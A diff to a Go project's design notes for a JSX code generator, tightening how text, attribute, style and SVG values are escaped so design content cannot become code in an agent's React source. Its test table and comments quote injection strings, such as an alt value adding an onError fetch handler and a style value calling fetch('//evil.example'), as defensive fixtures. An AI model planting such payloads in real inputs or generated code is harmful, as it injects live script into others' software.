@@ -45,15 +45,41 @@ type JSXOptions struct {
 //
 // Name is the node's layer name in PascalCase (non-alphanumerics removed; a
 // leading digit prefixed "Screen"; "" becomes "Frame"). Two-space indent.
-// Rules: style keys camelCase (-webkit-x → WebkitX), values as strings;
-// text split on "\n", the pieces joined by <br />; each piece raw, or, whenever
-// it holds any of { } < > " & or a backslash, as a JSX string expression
-// {<CanonicalJSON(piece)>} (task 08: encoding/json, SetEscapeHTML(false)), so a
-// quote is written \" and a backslash \\ and neither can end the string — never
-// "{\"" + piece + "\"}" by concatenation (review M16: text x"} {fetch(…)} {"
-// would become code in the Develop agent's source). & is in the set because JSX
-// decodes entities in raw text (&amp; would render as &); the backslash, though
-// literal in raw JSX text, is in it so one rule covers both escapes;
+// Rules: style keys camelCase (-webkit-x → WebkitX); they are allowlisted
+// property names (task 07), so always identifiers.
+// EVERY string written into the Develop agent's source goes through one of two
+// encoders, both built on CanonicalJSON (task 08: encoding/json,
+// SetEscapeHTML(false)), so a quote is written \" and a backslash \\ and neither
+// can end the string — never by concatenation such as "\"" + v + "\"" (review
+// M16: text x"} {fetch(…)} {" would become code; re-review RR-M16-1: so would a
+// style value, an attribute value and SVG text):
+//   - JS string context, every inline style value: always <CanonicalJSON(v)>,
+//     so 390px is written "390px" as before, and text-shadow's
+//     a" + fetch('//evil.example') + "b stays one string. Task 07 keeps that
+//     value: its middle is one CSS string token, holding no function token and
+//     no refused character, and font-family and text-shadow are RuleAny;
+//   - JSX context — a text piece, an attribute value, an SVG element's
+//     character data: raw when v holds no member of JSXTrigger, else
+//     {<CanonicalJSON(v)>} (a child) or name={<CanonicalJSON(v)>} (an
+//     attribute). JSXTrigger, one set for every JSX sink so no sink drifts:
+//     { } < > " & a backslash, U+0000–U+001F, U+2028 and U+2029. " ends a JSX
+//     attribute string, which has no escape; { } open an expression in text;
+//     TypeScript and Babel reject a raw < > or } in text; JSX decodes entities
+//     in raw text and in attribute strings alike (&amp; would render as &); the
+//     backslash is literal in raw JSX, in the set so one rule covers both JSON
+//     escapes; JSX folds raw line terminators and the whitespace around them.
+//     The attributes: alt, aria-label, placeholder, defaultValue, src,
+//     className (the Tailwind classes joined by one space) and every SVG
+//     attribute. So className="h-fit w-[390px]" stays raw, and Tailwind's
+//     arbitrary [font-family:"Geist_Sans",sans-serif] (a quoted family is not in
+//     the table below) is className={"[font-family:\"Geist_Sans\",sans-serif]"},
+//     not a JSX syntax error;
+// text split on "\n", the pieces joined by <br />, each piece by the JSX rule;
+// an svg node's stored markup (well-formed XML, task 07) is decoded with
+// encoding/xml, so its attribute values and character data reach the encoders
+// decoded, never as the markup's escaped bytes; each run of character data in
+// text, tspan, title or desc is one child by the JSX rule, not split, no <br />
+// (<text>{fetch(1)}</text> would otherwise be code);
 // input value → defaultValue, checked → defaultChecked;
 // a → href="#"; hidden → hidden; img → <img src alt />; svg attributes renamed
 // to their React names (stroke-width → strokeWidth, fill-rule → fillRule,
@@ -165,7 +191,8 @@ func DTCG(ts []doc.Token) ([]byte, error)
 |---|---|---|
 | `TestJSX_inline_golden` | task 08's card as `testdata/card.inline.jsx.golden`, byte for byte | nondeterministic key order |
 | `TestJSX_tailwind_golden` | the same as `card.tailwind.jsx.golden`: `className="h-fit w-[390px]"` on the artboard, `className="text-(--brand)"` on the text | the var() form written as `text-[var(--brand)]` |
-| `TestJSX_textEscapes` | text `a {b} <c>` renders as `{"a {b} <c>"}`; text `x"} {fetch(1)} {"` renders as `{"x\"} {fetch(1)} {\""}`; text `a\"b` (a backslash then a quote) renders as `{"a\\\"b"}`; text `Tom &amp; Jerry` renders as `{"Tom &amp; Jerry"}`; text `plain` stays raw; and for each wrapped output, `json.Unmarshal` of the bytes between the outer `{` and `}` yields the source text back exactly | raw braces (a JSX syntax error); a quote or backslash not escaped (text becomes code, review M16); `&` left raw (the entity decoded) |
+| `TestJSX_textEscapes` | text `a {b} <c>` renders as `{"a {b} <c>"}`; text `x"} {fetch(1)} {"` renders as `{"x\"} {fetch(1)} {\""}`; text `a\"b` (a backslash then a quote) renders as `{"a\\\"b"}`; text `Tom &amp; Jerry` renders as `{"Tom &amp; Jerry"}`; text `plain` stays raw; **one clause per `JSXTrigger` member, each piece holding that member alone** (re-review RR-M16-2): `a { b` → `{"a { b"}`, `a } b` → `{"a } b"}`, `a < b` → `{"a < b"}`, `a > b` → `{"a > b"}`, `a " b` → `{"a \" b"}`, `a & b` → `{"a & b"}`, `a\b` → `{"a\\b"}`, `a` CR `b` → `{"a\rb"}`, `a` U+2028 `b` → `{"a`, the six-character escape of U+2028, `b"}` (Go's encoder writes that escape whatever `SetEscapeHTML` says); and for each wrapped output, `json.Unmarshal` of the bytes between the outer `{` and `}` yields the source text back exactly | raw braces (a JSX syntax error); a quote or backslash not escaped (text becomes code, review M16); `&` left raw (the entity decoded); **any one member dropped from the set**: a raw `>` or `}` is a TypeScript error and a raw CR folds to a space (both verified with TypeScript 6.0.3's `transpileModule`, re-review round 2) |
+| `TestJSX_attrAndStyleEscapes` (re-review RR-M16-1) | the doc built through `Apply` with a permissive fake `Checker` (task 08's fixture route, `task-08.md:170`), so the writer is tested whatever task 07 would keep; inline format: a `text-shadow` of `a" + fetch('//evil.example') + "b` renders `textShadow: "a\" + fetch('//evil.example') + \"b"`, and `width: 390px` still `width: "390px"`; an `img` whose `alt` is `x" onError={() => fetch(1)} y="` renders `alt={"x\" onError={() => fetch(1)} y=\""}` and no `onError` prop; an `alt` of `Tom &amp; Jerry` renders `alt={"Tom &amp; Jerry"}`, and one of `plain` renders `alt="plain"`; Tailwind format: a `font-family` of `"Geist Sans",sans-serif` renders `className={"[font-family:\"Geist_Sans\",sans-serif]"}`; an svg node whose stored markup holds `<text>{fetch(1)}</text><text>a &amp; b</text>` and a `font-family` attribute stored as `&quot;Inter&quot;, sans-serif` renders `<text>{"{fetch(1)}"}</text>`, `<text>{"a & b"}</text>` and `fontFamily={"\"Inter\", sans-serif"}`; every wrapped value round-trips through `json.Unmarshal` to its source | a style value, attribute value or SVG text written by concatenation or copied raw: the `alt` gains a live `onError` handler, the style a `fetch` call, the SVG text a `fetch(1)` child and the quoted font stack is a JSX syntax error (each verified with TypeScript 6.0.3's `transpileModule`, re-review round 2); SVG text encoded from the markup's escaped bytes (`{"a &amp; b"}`); `&` left out of the attribute set (TypeScript decodes `alt="Tom &amp; Jerry"` to `Tom & Jerry`, verified) |
 | `TestJSX_input` | `value` → `defaultValue`, `checked` → `defaultChecked` | a controlled input with no handler (React warns) |
 | `TestJSX_svgAttrs` | `stroke-width="2"` → `strokeWidth="2"`; `viewBox` unchanged | kebab-case attributes (React warns, some drop) |
 | `TestJSX_componentName` | names `"settings page"`, `"2fa"`, `""` → `SettingsPage`, `Screen2fa`, `Frame` | an invalid identifier |
@@ -194,5 +221,10 @@ Expected: two `ok` lines.
 ## Not claimed
 
 - The JSX is not compiled or rendered here. Task 30's end-to-end run has a Develop agent use it.
+  The escape tests assert bytes and a `json.Unmarshal` round trip only. What those bytes mean to a
+  JSX compiler (a raw `>`/`}` is an error, a raw CR folds, `&amp;` decodes in an attribute string,
+  each naive sink becomes code) was checked once, by hand, against TypeScript 6.0.3's
+  `transpileModule` during plan review (b10 round 2), not by any test task 09 adds. A raw U+2028 in
+  JSX text was not checked; it is in `JSXTrigger` by JavaScript's line-terminator rule.
 - Tailwind output targets v4's syntax (`text-(--x)`); it is not validated by Tailwind itself.
 - The DTCG file follows a **draft** format.
